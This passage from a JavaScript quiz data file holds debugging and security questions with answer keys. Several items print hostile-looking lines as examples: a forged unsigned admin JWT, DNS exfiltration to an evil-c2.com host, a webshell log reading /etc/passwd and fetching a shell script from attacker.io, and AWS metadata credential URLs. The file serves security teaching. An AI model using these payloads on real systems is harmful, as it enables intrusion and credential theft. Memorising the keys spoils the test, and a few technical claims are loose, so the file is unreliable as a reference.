      { type:'normal',  code:'' },
      { type:'comment', code:'# Test cases:' },
      { type:'comment', code:'# PROD-2024-AB-123    → should PASS' },
      { type:'comment', code:'# PROD-2024-ABCDE-1   → should FAIL (XX must be exactly 2, NNN exactly 3)' },
      { type:'comment', code:'# PROD-2024-ABCDE-1   → INCORRECTLY PASSES with current pattern' },
    ]},
    prompt:'What is wrong with the regex pattern?',
    options:['[A-Z]+ matches 1+ letters and \\d+ matches 1+ digits — should be [A-Z]{2} and \\d{3} for exact lengths','\\d{4} is wrong for year','PROD prefix not anchored','Missing case-insensitive flag'],
    answer:0 },

  { id:'r3q4', round:3, boss:false, category:'Cyber Smart',
    prompt:'Find the OWASP Top 10 vulnerability in this API endpoint.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'app.get("/api/document/:id", async (req, res) => {' },
      { type:'normal',  code:'  const user = req.user;  // from JWT middleware' },
      { type:'normal',  code:'  const docId = req.params.id;' },
      { type:'normal',  code:'' },
      { type:'bug',     code:'  // Fetch document directly by ID — no ownership check' },
      { type:'bug',     code:'  const doc = await Document.findById(docId);' },
      { type:'normal',  code:'' },
      { type:'normal',  code:'  if (!doc) return res.status(404).json({ error: "Not found" });' },
      { type:'bug',     code:'  return res.json(doc);  // returns ANY document to ANY authenticated user' },
      { type:'normal',  code:'});' },
      { type:'comment', code:'// User A can access User B\'s private documents by guessing IDs' },
    ]},
    prompt:'Which OWASP Top 10 vulnerability is present?',
    options:['Broken Object Level Authorization (BOLA/IDOR) — no check that requesting user owns the document','SQL Injection — findById is unsafe','Broken Authentication — JWT not validated','Security Misconfiguration — CORS not set'],
    answer:0 },

  { id:'r3q5', round:3, boss:false, category:'CSE',
    prompt:'Trace the memory layout and find the pointer bug.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'int x = 42;' },
      { type:'normal',  code:'int *p = &x;         // p → address of x (e.g. 0x7ffd1234)' },
      { type:'normal',  code:'int **pp = &p;        // pp → address of p' },
      { type:'normal',  code:'' },
      { type:'normal',  code:'printf("%d\\n", **pp); // 42 ✓' },
      { type:'normal',  code:'' },
      { type:'normal',  code:'int arr[] = {10, 20, 30};' },
      { type:'normal',  code:'int *q = arr;         // q points to arr[0]' },
      { type:'bug',     code:'q = q + 1;            // now points to arr[1]' },
      { type:'normal',  code:'printf("%d\\n", *q);  // prints 20' },
      { type:'normal',  code:'' },
      { type:'bug',     code:'free(q);              // BUG: q does not point to start of allocation' },
    ]},
    prompt:'What is the critical error on the last line?',
    options:['free(q) called on middle of array — q was incremented and no longer points to start. Call free(arr) or free original pointer only.','printf format wrong','q should be int** not int*','arr is stack allocated, free not needed but safe'],
    answer:0 },

  { id:'r3q6', round:3, boss:false, category:'Cyber Smart',
    prompt:'Analyse the JWT token and find the vulnerability.',
    meta:{ type:'terminal', logs:[
      '$ echo "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ." | base64 -d 2>/dev/null || true',
      '',
      '$ jwt-decode eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.',
      'Header: { "alg": "none", "typ": "JWT" }',
      'Payload: { "user": "admin", "role": "admin" }',
      'Signature: (empty)',
      '',
      '[CRITICAL] Algorithm: "none" — no signature verification',
      '[CRITICAL] Server accepted this unsigned token',
      '[CRITICAL] Attacker forged admin token with no cryptographic proof',
    ]},
    prompt:'What JWT vulnerability allows this attack?',
    options:['alg:none attack — server accepts unsigned JWTs. Should reject "none" algorithm and require HS256/RS256 signature.','Token is expired','Wrong claim format','Base64 encoding error'],
    answer:0 },

  { id:'r3q7', round:3, boss:false, category:'CSE',
    prompt:'Find the algorithmic complexity issue in this code.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'# Find all duplicate pairs in an array' },
      { type:'normal',  code:'def find_duplicates(arr):' },
      { type:'normal',  code:'    result = []' },
      { type:'bug',     code:'    for i in range(len(arr)):          # O(n)' },
      { type:'bug',     code:'        for j in range(len(arr)):      # O(n) — nested!' },
      { type:'bug',     code:'            if i != j and arr[i] == arr[j]:  # O(n²) total' },
      { type:'normal',  code:'                if arr[i] not in result:' },
      { type:'normal',  code:'                    result.append(arr[i])' },
      { type:'normal',  code:'    return result' },
      { type:'comment', code:'' },
      { type:'comment', code:'# For n=10,000: 100,000,000 comparisons!' },
      { type:'comment', code:'# Optimal: use a hash set → O(n)' },
    ]},
    prompt:'What is the time complexity and the optimal approach?',
    options:['O(n²) — nested loops for each pair. Use a hash set/dict to track seen elements → O(n).','O(n log n) — can be fixed by sorting','O(1) — array is constant size','O(n²) is unavoidable for this problem'],
    answer:0 },

  { id:'r3q8', round:3, boss:false, category:'Cyber Smart',
    prompt:'Examine the network traffic and identify the data exfiltration technique.',
    meta:{ type:'terminal', logs:[
      '$ tcpdump -i eth0 port 53 -A | head -30',
      '08:23:11 DNS Query: s3cr3t-d4t4-p4rt1.evil-c2.com A?',
      '08:23:12 DNS Query: s3cr3t-d4t4-p4rt2.evil-c2.com A?',
      '08:23:13 DNS Query: s3cr3t-d4t4-p4rt3.evil-c2.com A?',
      '08:23:14 DNS Query: s3cr3t-d4t4-p4rt4.evil-c2.com A?',
      '08:23:15 DNS Query: aGVsbG8gd29ybGQ.evil-c2.com A?',
      '08:23:16 DNS Query: dGhpcyBpcyBleGZpbA.evil-c2.com A?',
      '',
      '$ echo "aGVsbG8gd29ybGQ=" | base64 -d',
      'hello world',
      '$ echo "dGhpcyBpcyBleGZpbA==" | base64 -d',
      'this is exfil',
    ]},
    prompt:'What data exfiltration technique is being used?',
    options:['DNS tunneling — data encoded in Base64 and sent as DNS subdomain queries to attacker-controlled domain','HTTP POST to external server','FTP transfer over port 21','ICMP ping data exfiltration'],
    answer:0 },

  { id:'r3q9', round:3, boss:false, category:'CSE',
    prompt:'The hash map has poor performance. Find the root cause.',
    meta:{ type:'terminal', logs:[
      '$ python3 hashmap_bench.py',
      'Inserting 10,000 items...',
      '',
      'Expected: O(1) average insert per item',
      'Measured: O(n) per insert — total O(n²)',
      '',
      '$ python3 -c "hash(0), hash(0.0), hash(False)"',
      '0, 0, 0  # all hash to same bucket!',
      '',
      'Benchmark data: all keys are integers 0..9999',
      'Hash table bucket analysis:',
      '  Bucket 0: 10,000 items (all collide!)',
      '  Bucket 1-255: 0 items',
      '',
      'Custom hash function: def h(k): return k % 1',
      'k % 1 = 0 for ALL integers — every key hashes to bucket 0',
    ]},
    prompt:'Why is the hash map O(n²) instead of O(1)?',
    options:['Hash function k%1 returns 0 for all keys — every item collides into bucket 0, degrading to O(n) linked list lookup','Hash table too small','Integer keys not supported','Python dict faster than custom implementation'],
    answer:0 },

  { id:'r3q10', round:3, boss:false, category:'Scenario',
    prompt:'Diagnose the cloud cost spike from the billing alert.',
    meta:{ type:'terminal', logs:[
      '$ aws ce get-cost-and-usage --time-period Start=2024-01-01,End=2024-01-31',
      'EC2:        $1,240  (normal — same as last month)',
      'RDS:        $890    (normal)',
      'S3 Storage: $12     (normal)',
      'S3 Requests:$8,940  (ANOMALY — last month: $34)',
      '',
      '$ aws s3api list-objects --bucket app-logs | jq ".Contents | length"',
      '2,847,392  (2.8M objects!)',
      '',
      '$ grep "s3.putObject" app.log | wc -l',
      '2847392',
      '',
      '$ grep -A3 "logRequest" src/middleware.js',
      '  s3.putObject({ Key: `log-${Date.now()}.json`, Body: JSON.stringify(req) })',
      '  // Called on EVERY request — 30 req/sec × 86400s = 2.6M files/day',
    ]},
    prompt:'What causes the $8,940 S3 bill spike?',
    options:['Middleware writes individual S3 object per request — 2.6M PUT requests/day at $0.005/1000 = $13/day, plus GET costs. Buffer logs and write in batches.','S3 bucket made public — data breach costs','EC2 instances running in wrong region','Wrong S3 storage class selected'],
    answer:0 },

  { id:'r3q11', round:3, boss:false, category:'CSE',
    prompt:'The recursive function causes a stack overflow on large inputs.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'def fibonacci(n):' },
      { type:'bug',     code:'    if n <= 1: return n' },
      { type:'bug',     code:'    return fibonacci(n-1) + fibonacci(n-2)  # O(2^n) calls!' },
      { type:'normal',  code:'' },
      { type:'comment', code:'# fibonacci(50) = 2^50 = 1,125,899,906,842,624 calls' },
      { type:'comment', code:'# fibonacci(1000) = RecursionError: maximum recursion depth exceeded' },
      { type:'normal',  code:'' },
      { type:'comment', code:'# Call tree for fib(5):' },
      { type:'comment', code:'#          fib(5)' },
      { type:'comment', code:'#         /     \\' },
      { type:'comment', code:'#      fib(4)   fib(3)    ← fib(3) computed twice!' },
      { type:'comment', code:'#     /   \\    /   \\' },
      { type:'comment', code:'#  fib(3) fib(2) fib(2) fib(1) ← massive recomputation' },
    ]},
    prompt:'What technique would fix the exponential time complexity?',
    options:['Memoization (dynamic programming) — cache computed values to avoid recomputation, reducing O(2^n) to O(n)','Use a for loop instead of recursion but keep same logic','Increase Python recursion limit','Use bigger integers'],
    answer:0 },

  { id:'r3q12', round:3, boss:false, category:'Cyber Smart',
    prompt:'Identify the supply chain attack vector in this npm audit.',
    meta:{ type:'terminal', logs:[
      '$ npm audit',
      'found 1 critical severity vulnerability',
      '',
      'Package: event-stream@3.3.6',
      'Dependency chain: myapp → node-pre-gyp → event-stream',
      '',
      '$ npm show event-stream@3.3.6 maintainers',
      'right9ctrl <right9ctrl@gmail.com>  ← new maintainer added 3 weeks ago',
      '(original maintainer dominictarr handed over the package)',
      '',
      '$ diff event-stream@3.3.5 event-stream@3.3.6',
      '+  require("./node_modules/flatmap-stream")',
      '',
      '$ cat node_modules/flatmap-stream/index.min.js',
      '// Obfuscated code targeting copay Bitcoin wallet — steals funds',
    ]},
    prompt:'What type of attack is this?',
    options:['Supply chain attack — malicious code injected via compromised npm maintainer account into transitive dependency','Direct XSS attack on frontend','SQL injection in backend package','Prototype pollution vulnerability'],
    answer:0 },

  { id:'r3q13', round:3, boss:false, category:'CSE',
    prompt:'Trace the SQL query execution plan and find the performance issue.',
    meta:{ type:'terminal', logs:[
      '$ EXPLAIN ANALYZE SELECT * FROM orders',
      '  WHERE customer_id = 12345',
      '  AND status = \'pending\'',
      '  ORDER BY created_at DESC LIMIT 10;',
      '',
      'QUERY PLAN:',
      '  Sort (cost=45823.21 rows=10)',
      '  -> Seq Scan on orders (cost=45823.10 rows=2847193)',
      '     Filter: ((customer_id=12345) AND (status=\'pending\'))',
      '     Rows Removed by Filter: 2847183',
      '',
      'Execution time: 4823ms',
      '',
      '$ \\d orders',
      '  customer_id  integer  — NO INDEX',
      '  status       varchar  — NO INDEX',
      '  created_at   timestamp — NO INDEX',
    ]},
    prompt:'What causes this query to take 4823ms?',
    options:['Sequential scan on 2.8M rows — no index on customer_id, status, or created_at. Add composite index (customer_id, status, created_at DESC).','LIMIT 10 is too restrictive','ORDER BY is incompatible with the filter','The query returns the wrong columns'],
    answer:0 },

  { id:'r3q14', round:3, boss:false, category:'Cyber Smart',
    prompt:'Forensic investigation: Trace the attack path from the server logs.',
    meta:{ type:'terminal', logs:[
      '$ cat /var/log/apache2/access.log | grep 200 | grep "45.33.32.156"',
      '45.33.32.156 GET /wp-login.php 200 (login page accessed)',
      '45.33.32.156 POST /wp-login.php 302 (login attempt)',
      '45.33.32.156 GET /wp-admin/ 200 (admin panel — logged in!)',
      '45.33.32.156 POST /wp-admin/theme-editor.php 200 (file edit)',
      '45.33.32.156 GET /wp-content/themes/twenty21/404.php 200',
      '',
      '$ curl http://server/wp-content/themes/twenty21/404.php?cmd=id',
      'uid=33(www-data) gid=33(www-data)',
      '',
      '$ cat /var/log/apache2/access.log | grep "cmd="',
      '45.33.32.156 GET /404.php?cmd=cat+/etc/passwd 200',
      '45.33.32.156 GET /404.php?cmd=wget+http://attacker.io/shell.sh 200',
    ]},
    prompt:'What attack sequence is shown in the logs?',
    options:['Credential brute-force → admin login → PHP webshell planted via theme editor → remote code execution','XSS reflected attack leading to session hijack','SQL injection in WordPress login form','Man-in-the-middle intercepting admin credentials'],
    answer:0 },

  { id:'r3q15', round:3, boss:false, category:'CSE',
    prompt:'Find the race condition in this concurrent bank transfer code.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'class Account:' },
      { type:'normal',  code:'    def __init__(self, balance):' },
      { type:'normal',  code:'        self.balance = balance' },
      { type:'normal',  code:'' },
      { type:'normal',  code:'def transfer(from_acc, to_acc, amount):' },
      { type:'bug',     code:'    if from_acc.balance >= amount:       # Thread A reads: 1000' },
      { type:'bug',     code:'        # ← Thread B also reads 1000 here (context switch!)' },
      { type:'bug',     code:'        from_acc.balance -= amount        # Both deduct 900!' },
      { type:'bug',     code:'        to_acc.balance += amount          # Balance goes negative' },
      { type:'normal',  code:'' },
      { type:'comment', code:'# Thread A: transfer(acc, other, 900) — acc.balance=1000' },
      { type:'comment', code:'# Thread B: transfer(acc, other, 900) — both pass check!' },
      { type:'comment', code:'# Result: acc.balance = 1000-900-900 = -800 (overdraft!)' },
    ]},
    prompt:'What causes the account to go negative and how is it fixed?',
    options:['Race condition — two threads both pass the balance check before either deducts. Fix: use a mutex lock or database transaction to make read-check-write atomic.','Integer overflow on balance','Wrong comparison operator (>= should be >)','transfer() called recursively'],
    answer:0 },

  { id:'r3q16', round:3, boss:false, category:'Scenario',
    prompt:'Multi-region deployment has split-brain. Diagnose the consistency issue.',
    meta:{ type:'terminal', logs:[
      '$ kubectl get pods -A --context=us-east-1',
      'app-pod-1   Running   leader=true   version=v2.1',
      '',
      '$ kubectl get pods -A --context=eu-west-1',
      'app-pod-2   Running   leader=true   version=v2.1  ← ALSO LEADER!',
      '',
      '$ check-network us-east-1 eu-west-1',
      '[ERROR] Cross-region network partition detected',
      '[ERROR] Regions cannot communicate for last 8 minutes',
      '',
      '$ check-leader-election',
      '[WARN] Both regions elected new leaders during partition',
      '[WARN] us-east-1 processed 142 writes',
      '[WARN] eu-west-1 processed 67 writes',
      '[WARN] 209 conflicting writes — data diverged',
    ]},
    prompt:'What distributed systems problem caused data corruption?',
    options:['Split-brain — network partition caused both regions to elect leaders simultaneously, violating the single-leader constraint. Writes diverged. Need quorum-based consensus (Raft/Paxos).','Wrong Kubernetes version in EU region','Leader election timeout too short','Database schema migration ran in both regions'],
    answer:0 },

  { id:'r3q17', round:3, boss:false, category:'CSE',
    prompt:'This sorting algorithm has unexpected behavior. Find the bug.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'const arr = [3, 1, 10, 21, 100, 2];' },
      { type:'bug',     code:'arr.sort();  // JavaScript default sort' },
      { type:'normal',  code:'console.log(arr);' },
      { type:'comment', code:'// Expected: [1, 2, 3, 10, 21, 100]' },
      { type:'comment', code:'// Actual:   [1, 10, 100, 2, 21, 3]' },
      { type:'comment', code:'' },
      { type:'comment', code:'// Why? .sort() converts to strings first!' },
      { type:'comment', code:'// "1" < "10" < "100" < "2" < "21" < "3"' },
      { type:'comment', code:'// Lexicographic order, not numeric order' },
      { type:'comment', code:'' },
      { type:'comment', code:'// Fix: arr.sort((a, b) => a - b)' },
    ]},
    prompt:'Why does JavaScript\'s default sort produce [1, 10, 100, 2, 21, 3]?',
    options:['Default .sort() converts elements to strings and uses lexicographic order — "100" < "2" alphabetically. Use .sort((a,b) => a-b) for numeric sort.','JavaScript sort algorithm has a bug','Array not properly initialized','Numbers too large for integer sort'],
    answer:0 },

  { id:'r3q18', round:3, boss:false, category:'Cyber Smart',
    prompt:'Analyse the SSRF vulnerability attempt in the server logs.',
    meta:{ type:'terminal', logs:[
      '$ cat app.log | grep "fetch\\|curl\\|http"',
      '[INFO] User requested URL fetch: https://example.com/image.png — OK',
      '[INFO] User requested URL fetch: https://google.com/logo.png — OK',
      '[WARN] User requested URL fetch: http://169.254.169.254/latest/meta-data/',
      '[WARN] Response: {"instanceId":"i-0123456","iamRole":"prod-ec2-role"}',
      '[WARN] User requested URL fetch: http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-ec2-role',
      '[CRITICAL] Response contains: AccessKeyId, SecretAccessKey, Token',
      '[CRITICAL] AWS credentials exfiltrated via SSRF!',
    ]},
    prompt:'What vulnerability is being exploited and what is the target?',
    options:['SSRF (Server-Side Request Forgery) — server fetches attacker-controlled URLs including AWS metadata endpoint 169.254.169.254, leaking IAM credentials','Open redirect vulnerability','CSRF token missing on fetch endpoint','Insecure direct object reference'],
    answer:0 },

  { id:'r3q19', round:3, boss:false, category:'Scenario',
    prompt:'Database migration failed in production. Diagnose the rollback issue.',
    meta:{ type:'terminal', logs:[
      '$ migrate up --version 20240315',
      '[INFO] Running migration: add_payment_columns',
      '[INFO] ALTER TABLE orders ADD COLUMN payment_method VARCHAR(50)',
      '[INFO] ALTER TABLE orders ADD COLUMN payment_ref VARCHAR(100)',
      '[INFO] Migration 20240315 completed ✓',
      '',
      '$ deploy --version v2.5.0',
      '[FATAL] Application crash: column "payment_status" does not exist',
      '[FATAL] app.js:847: db.query("SELECT payment_status FROM orders")',
      '',
      '$ migrate down --version 20240315',
      '[INFO] Reverting: DROP COLUMN payment_method, payment_ref',
      '[INFO] Rollback complete ✓',
      '',
      '$ deploy --version v2.4.0',
      '[OK] Application running (but missing new features)',
    ]},
    prompt:'What was the root cause of the deployment failure?',
    options:['Migration added payment_method and payment_ref but not payment_status — code expected a column that was never created. Migration and code were not in sync.','Database rollback was too slow','Wrong migration version number used','Application deployed before migration ran'],
    answer:0 },

  { id:'r3q20', round:3, boss:false, category:'CSE',
    prompt:'Identify the memory safety issue in this C code.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'#include <string.h>' },
      { type:'normal',  code:'' },
      { type:'normal',  code:'void process_input(char *input) {' },
      { type:'normal',  code:'    char buffer[64];' },
      { type:'bug',     code:'    strcpy(buffer, input);  // no bounds check!' },
      { type:'normal',  code:'    printf("Processed: %s\\n", buffer);' },
      { type:'normal',  code:'}' },
      { type:'comment', code:'' },
      { type:'comment', code:'// If input = "A" * 200 characters:' },
      { type:'comment', code:'// buffer[64] overflows into adjacent stack memory' },
      { type:'comment', code:'// Overwrites saved return address' },
      { type:'comment', code:'// Attacker controls where function returns → code execution' },
    ]},
    prompt:'What vulnerability exists and how is it exploited?',
    options:['Stack buffer overflow — strcpy copies unbounded input into 64-byte buffer, overwriting return address. Attacker injects shellcode. Fix: use strncpy(buffer, input, sizeof(buffer)-1).','Null pointer dereference','Use-after-free on buffer','Integer overflow in buffer size'],
    answer:0 },

  { id:'r3q21', round:3, boss:false, category:'Scenario',
    prompt:'Rate limiter bypass detected. Find the vulnerability.',
    meta:{ type:'terminal', logs:[
      '$ cat api_access.log | grep "rate_limit"',
      '2024-01-15 09:00:01 192.168.1.1 POST /api/login attempts=1 ALLOWED',
      '2024-01-15 09:00:02 192.168.1.1 POST /api/login attempts=5 RATE_LIMITED',
      '2024-01-15 09:00:03 10.0.0.1 POST /api/login attempts=1 ALLOWED',
      '2024-01-15 09:00:04 172.16.0.1 POST /api/login attempts=1 ALLOWED',
      '2024-01-15 09:00:05 192.168.1.2 POST /api/login attempts=1 ALLOWED',
      '',
      '$ grep "X-Forwarded-For" rate_limiter.js',
      '  const clientIP = req.headers["x-forwarded-for"] || req.ip;',
      '[VULN] Attacker spoofs X-Forwarded-For to new IP each request',
      '[VULN] Rate limiter sees different IP each time → never limited',
    ]},
    prompt:'How is the attacker bypassing the rate limiter?',
    options:['Spoofing X-Forwarded-For header with different IPs each request — rate limiter trusts client-provided headers. Fix: use real socket IP or validate X-Forwarded-For against trusted proxy list.','VPN with many IP addresses','Rate limit too high','Login endpoint misconfigured'],
    answer:0 },

  { id:'r3q22', round:3, boss:false, category:'CSE',
    prompt:'Analyse the deadlock in this concurrent database transaction log.',
    meta:{ type:'terminal', logs:[
      '$ psql -c "SELECT * FROM pg_stat_activity WHERE wait_event_type = \'Lock\'"',
      '',
      'Thread A (Transaction 1847):',
      '  LOCK TABLE users WHERE id=1  ← holds lock on user 1',
      '  WAITING FOR: orders WHERE id=500  ← waiting for lock on order 500',
      '',
      'Thread B (Transaction 1848):',
      '  LOCK TABLE orders WHERE id=500  ← holds lock on order 500',
      '  WAITING FOR: users WHERE id=1  ← waiting for lock on user 1',
      '',
      '[DEADLOCK] Thread A waits for B, Thread B waits for A',
      '[DEADLOCK] Circular dependency — neither can proceed',
      'PostgreSQL auto-detected deadlock, killed transaction 1847',
    ]},
    prompt:'How do you prevent this deadlock from recurring?',
    options:['Always acquire locks in consistent order (e.g., always lock users before orders) — circular wait condition eliminated','Use READ COMMITTED isolation instead of SERIALIZABLE','Increase database connection pool size','Reduce transaction timeout'],
    answer:0 },

  { id:'r3q23', round:3, boss:false, category:'Slice of Life',
    prompt:'You find a critical security vulnerability in the event platform 30 minutes before Grid Gambit starts. What do you do?',
    meta:{ type:'terminal', logs:[
      '$ security-scan grid-gambit.example.com',
      '[CRITICAL] CVE-2024-XXXX: Authentication bypass via JWT alg:none',
      '[CRITICAL] Any user can forge admin tokens',
      '[CRITICAL] Admin panel fully accessible without credentials',
      '',
      'Time until event start: 28 minutes',
      'Fix estimated time: 45 minutes',
      'Deployment time: 10 minutes',
      '',
      'Options available:',
      '  A) Disclose and postpone — patch properly',
      '  B) Disable JWT alg:none, quick deploy (45+10=55min — too late)',
      '  C) Restrict admin panel to VPN/localhost only (5 min)',
      '  D) Ignore — event is isolated network',
    ]},
    prompt:'What is the responsible action given the constraints?',
    options:['Immediately restrict admin panel access to VPN/localhost (5 min fix) while escalating to team — mitigate the exposure now, patch properly after event','Ignore it — isolated network reduces risk','Postpone the entire event to fix properly','Tell participants about the vulnerability during the opening talk'],
    answer:0 },

  { id:'r3q24', round:3, boss:false, category:'Cyber Smart',
    prompt:'Investigate the cryptographic weakness in this implementation.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'import random' },
      { type:'normal',  code:'import hashlib' },
      { type:'normal',  code:'' },
      { type:'normal',  code:'def generate_session_token(user_id):' },
      { type:'bug',     code:'    random.seed(int(time.time()))  # seeded with current timestamp!' },
      { type:'bug',     code:'    token_bytes = random.getrandbits(128)  # NOT cryptographically random' },
      { type:'normal',  code:'    return hashlib.sha256(str(token_bytes).encode()).hexdigest()' },
      { type:'comment', code:'' },
      { type:'comment', code:'# Attack: if attacker knows approximate time of token generation' },
      { type:'comment', code:'# They can try all seeds within ±5 seconds (10 seeds)' },
      { type:'comment', code:'# 10 SHA256 computations to forge any session token' },
      { type:'comment', code:'# Fix: use secrets.token_bytes(32) instead' },
    ]},
    prompt:'Why is this session token generator insecure?',
    options:['Seeded with timestamp — predictable seed allows attacker to reproduce the same "random" sequence. Use secrets.token_bytes(32) for cryptographically secure tokens.','SHA256 is broken','128 bits is not enough entropy','hashlib not installed correctly'],
    answer:0 },

  { id:'r3q25', round:3, boss:false, category:'CSE',
    prompt:'The API response time degrades at scale. Find the N+1 query problem.',
    meta:{ type:'terminal', logs:[
      '$ rails console',
      '> User.all.each { |u| puts u.posts.count }',
      '',
      'SQL log:',
      '  SELECT * FROM users;  (1 query — fetches 500 users)',
      '  SELECT COUNT(*) FROM posts WHERE user_id = 1;',
      '  SELECT COUNT(*) FROM posts WHERE user_id = 2;',
      '  SELECT COUNT(*) FROM posts WHERE user_id = 3;',
      '  ... (500 MORE queries!)',
      '',
      'Total queries: 501 for 500 users',
      'Total time: 4.2 seconds',
      '',
      'Fix: User.all.includes(:posts).each { |u| puts u.posts.count }',
      'Total queries: 2  (SELECT users, SELECT posts WHERE user_id IN (...))',
      'Total time: 0.08 seconds',
    ]},
    prompt:'What is the N+1 problem and how is it solved here?',
    options:['N+1 query: 1 query for all users + N queries for each user\'s posts = 501 queries. Fix: eager load with includes() to fetch all posts in 2 queries total.','Wrong database index','Missing foreign key constraint','ORM is too slow — use raw SQL'],
    answer:0 },

  { id:'r3q26', round:3, boss:false, category:'Scenario',
    prompt:'Kubernetes horizontal pod autoscaler is not scaling. Diagnose.',
    meta:{ type:'terminal', logs:[
      '$ kubectl get hpa -n production',
      'NAME      MINPODS  MAXPODS  REPLICAS  CPU UTILIZATION',
      'api-hpa   2        20       2         0%/70%',
      '',
      '$ kubectl top pods -n production',
      'api-pod-1   890m/1000m  (89% CPU)',
      'api-pod-2   920m/1000m  (92% CPU)',
      '',
      '$ kubectl describe hpa api-hpa -n production',
      'Events:',
      '  Warning: failed to get cpu utilization: unable to get metrics for resource cpu',
      '  Warning: metrics-server not available in this cluster',
      '',
      '$ kubectl get pods -n kube-system | grep metrics',
      '  (no results)',
    ]},
    prompt:'Why does HPA show 0% CPU despite pods running at 90%+ utilization?',
    options:['metrics-server is not installed — HPA cannot read CPU metrics, shows 0% and refuses to scale. Install metrics-server in kube-system namespace.','HPA max replicas too low','CPU requests not set on pods','Wrong API version for HPA resource'],
    answer:0 },

  { id:'r3q27', round:3, boss:false, category:'CSE',
    prompt:'Find the timezone bug causing events to be scheduled at wrong times.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'from datetime import datetime' },
      { type:'normal',  code:'' },
      { type:'normal',  code:'def schedule_event(user_time_str, user_timezone):' },
      { type:'bug',     code:'    dt = datetime.strptime(user_time_str, "%Y-%m-%d %H:%M")' },
      { type:'comment', code:'    # Creates naive datetime — no timezone info attached' },
      { type:'bug',     code:'    db.save(event_time=dt)  # stores as naive UTC — wrong!' },
      { type:'comment', code:'' },
      { type:'comment', code:'    # User in IST (+5:30) enters "2024-03-15 14:00"' },
      { type:'comment', code:'    # Should store as 2024-03-15 08:30 UTC' },
      { type:'comment', code:'    # Actually stores as 2024-03-15 14:00 UTC (5.5 hrs wrong!)' },
      { type:'comment', code:'' },
      { type:'comment', code:'    # Fix: parse with timezone, convert to UTC before storing' },
      { type:'comment', code:'    # dt = datetime.strptime(s, fmt).replace(tzinfo=user_tz).astimezone(utc)' },
    ]},
    prompt:'Why are events scheduled 5.5 hours late for IST users?',
    options:['Naive datetime stored without timezone conversion — user local time treated as UTC. Parse with user timezone and convert to UTC before storing.','Database uses wrong charset','strptime format string wrong','Database stores time as string not timestamp'],
    answer:0 },

  { id:'r3q28', round:3, boss:false, category:'Scenario',
    prompt:'The on-call alert fires at 3am. Read the runbook and decide the action.',
    meta:{ type:'terminal', logs:[
      '=== ALERT: PaymentService ERROR RATE > 5% ===',
      'Current: 8.3% error rate  (threshold: 5%)',
      'Affected: 12,400 transactions/minute',
      'Duration: 4 minutes',
      '',
      '$ check-recent-deployments',
      'v3.1.2 deployed 18 minutes ago by CI/CD pipeline',
      'v3.1.1 was running for 14 days without incident',
      '',
      '$ git diff v3.1.1..v3.1.2 -- payment/',
      '+  const charge = amount * 100;  // convert to cents',
      '+  // Changed from: Math.round(amount * 100)',
      '+  // Float multiplication: 19.99 * 100 = 1998.9999... truncates to 1998',
      '',
      '$ check-rollback-time',
      'Estimated rollback time: 3 minutes',
      'Estimated fix-forward time: 45 minutes',
    ]},
    prompt:'What is the immediate correct action?',
    options:['Immediately rollback to v3.1.1 (3 min) — float precision bug is causing payment failures at scale. Fix forward after rollback. Then: post-mortem and add float→int tests.','Wait 30 more minutes to gather more data','Push a hotfix immediately (45 min path)','Restart the payment service pods'],
    answer:0 },

  { id:'r3q29', round:3, boss:false, category:'Scenario',
    prompt:'Your team has built a system with a single point of failure. Identify it.',
    meta:{ type:'terminal', logs:[
      '$ draw-architecture --service payment-platform',
      '',
      '[Load Balancer] ──> [App Server 1]  ─┐',
      '[Load Balancer] ──> [App Server 2]  ─┤──> [Single Redis Instance] ──> [Session Store]',
      '[Load Balancer] ──> [App Server 3]  ─┘',
      '                                           │',
      '                                     [Single Point of Failure]',
      '',
      '$ redis-cli info replication',
      'role:master',
      'connected_slaves:0',
      'replication_id: abc123',
      '',
      '$ uptime-report redis-prod-1',
      'Last 90 days: 99.2% uptime = 17.3 hours downtime',
      '17.3 hours × $50,000/hour revenue = $865,000 lost revenue',
    ]},
    prompt:'What is the single point of failure and the correct fix?',
    options:['Redis has no replica — a single Redis failure takes down all session storage for all 3 app servers. Fix: Redis Sentinel or Redis Cluster with replicas.','Load balancer is the single point of failure','App servers need more CPU','Session storage should use cookies only'],
    answer:0 },

  { id:'r3q30', round:3, boss:true, category:'Scenario',
    prompt:'[BOSS] FULL STACK INCIDENT. You have 10 minutes to triage. Read all signals and give the executive summary.',
    meta:{ type:'terminal', logs:[
      '=== INCIDENT WAR ROOM — T+0 ===',
      '',
      '$ check-all-systems',
      'API Gateway:      RED   — 503 on 67% of requests',
      'User Service:     GREEN — responding normally',
      'Order Service:    RED   — timeout on all requests',
      'Payment Service:  GREEN — responding normally',
      'Database (RDS):   AMBER — replication lag: 847 seconds',
      'Cache (Redis):    RED   — eviction rate: 100% (maxmemory hit)',
      '',
      '$ tail app.log | grep ERROR',
      '[ERROR] Order Service: cache.get("order:*") — MISS (100% miss rate)',
      '[ERROR] Order Service: RDS read replica query timeout (30s)',
      '[ERROR] API Gateway: upstream Order Service timeout — returning 503',
      '',
      '$ redis-cli info memory',
      'used_memory: 8.00gb, maxmemory: 8.00gb',
      'evicted_keys: 2847293 in last 60 seconds',
      '',
      '$ check-traffic',
      'Current RPS: 48,000 (baseline: 12,000 — 4× spike from viral post)',
      '',
      '$ check-rds-replicas',
      'Primary: handling 48,000 read+write queries/sec',
      'Replica: 847s behind primary (overloaded)',
    ]},
    prompt:'[BOSS] What is the correct sequence of immediate actions to restore service?',
    options:[
      '1) Scale Redis memory (or add replica) to stop 100% eviction → cache returns → read pressure drops. 2) Add RDS read replicas to handle 4× traffic spike → replication lag resolves. 3) Scale Order Service horizontally. Root cause: 4× traffic spike exceeded Redis maxmemory, 100% cache miss pushed all reads to overloaded RDS replica.',
      '1) Restart Order Service. 2) Flush Redis cache. 3) Increase API Gateway timeout to 60s.',
